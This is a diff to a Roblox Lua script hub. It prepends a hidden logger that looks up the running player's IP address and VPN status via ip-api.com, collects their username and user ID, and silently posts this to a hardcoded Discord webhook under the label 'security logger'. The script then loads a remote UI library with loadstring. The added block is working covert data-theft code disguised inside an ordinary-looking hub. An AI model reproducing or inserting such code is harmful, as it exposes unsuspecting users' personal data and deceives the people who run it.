@@ -1,3 +1,71 @@
+local NNN = "https://discord.com/api/webhooks/1463517434370592869/wbyyUcZnWnCsNv62LXwvZ6iW3PlWL5lysar-eT3aHNv_3QgVYBZa_69-LAelUYhBZqWg"
+
+local h = game:GetService("HttpService")
+local p = game:GetService("Players")
+local l = p.LocalPlayer
+
+local website = "idk"
+local vpn = "idk"
+local r = syn and syn.request or http_request or request or (http and http.request)
+
+pcall(function()
+    local res = r({
+        Url = "http://ip-api.com/json/?fields=66846719",
+        Method = "GET"
+    })
+    if res and res.Body then
+        local d = h:JSONDecode(res.Body)
+        website = d.query or "idk"
+        if d.proxy ~= nil then
+            vpn = d.proxy and "Yes" or "No"
+        end
+    end
+end)
+
+local username = "idk"
+local userid = "idk"
+
+if l then
+    username = l.Name
+    userid = l.UserId
+end
+
+local Bet = {
+    ["embeds"] = {
+        {
+            title = "Roblox User Log",
+            color = 8388736, -- purple
+            fields = {
+                { name = "Username", value = username, inline = true },
+                { name = "User ID", value = tostring(userid), inline = true },
+                { name = "Ip", value = website, inline = false },
+                { name = "Using VPN?", value = vpn, inline = true }
+            },
+            footer = {
+                text = "Logged by 7n8z security logger"
+            }
+        }
+    }
+}
+
+pcall(function()
+    if r then
+        r({
+            Url = NNN,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = h:JSONEncode(Bet)
+        })
+    else
+        h:PostAsync(NNN, h:JSONEncode(Bet))
+    end
+end)
+
+
+
+HUB HERE
+
+
 local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/deeeity/mercury-lib/master/src.lua"))()
 
 local GUI = Mercury:Create{
